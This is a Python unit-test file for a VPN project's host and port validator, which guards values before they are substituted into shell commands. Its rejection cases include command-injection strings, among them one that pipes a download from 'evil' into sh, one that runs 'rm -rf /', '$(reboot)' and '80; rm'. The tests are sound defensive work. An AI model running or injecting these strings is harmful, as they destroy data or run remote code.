"""Юнит-тесты валидатора host/port (граница доверия перед подстановкой в shell)."""

from __future__ import annotations

import pytest

from vpnhub.common.net import is_valid_host, is_valid_port

pytestmark = pytest.mark.unit


@pytest.mark.parametrize(
    "host",
    [
        "203.0.113.10",
        "8.8.8.8",
        "::1",
        "2001:db8::1",
        "vm0000001.example.com",
        "example.com",
        "sub.domain.co.uk",
        "localhost",
        "a-b-c.host-1.net",
    ],
)
def test__is_valid_host__valid__true(host: str) -> None:
    assert is_valid_host(host) is True


@pytest.mark.parametrize(
    "host",
    [
        None,
        "",
        "   ",
        '1.1.1.1"; curl evil|sh #',
        "$(reboot)",
        "`id`",
        "a;b",
        "host name",
        "10.0.0.1 && rm -rf /",
        "a|b",
        "foo$bar",
        "-leading-hyphen.com",
        "trailing-hyphen-.com",
        "under_score.com",
        "a" * 64 + ".com",  # метка > 63
        "1.2.3.4\nevil",  # внутренний перевод строки
        "1.2.3.4\n",  # хвостовой \n не должен «прощаться» (не обрезаем)
        " 1.2.3.4",  # окружающие пробелы недопустимы
        "1.2.3.4 ",
        "a" * 254,  # имя > 253
    ],
)
def test__is_valid_host__invalid_or_unsafe__false(host: str | None) -> None:
    assert is_valid_host(host) is False


@pytest.mark.parametrize("port", ["1", "22", "443", "65535", "51820", 8080])
def test__is_valid_port__valid__true(port: object) -> None:
    assert is_valid_port(port) is True


@pytest.mark.parametrize("port", ["0", "65536", "-1", "abc", "", None, "80; rm", "8.0", "80\n", " 80 "])
def test__is_valid_port__invalid__false(port: object) -> None:
    assert is_valid_port(port) is False
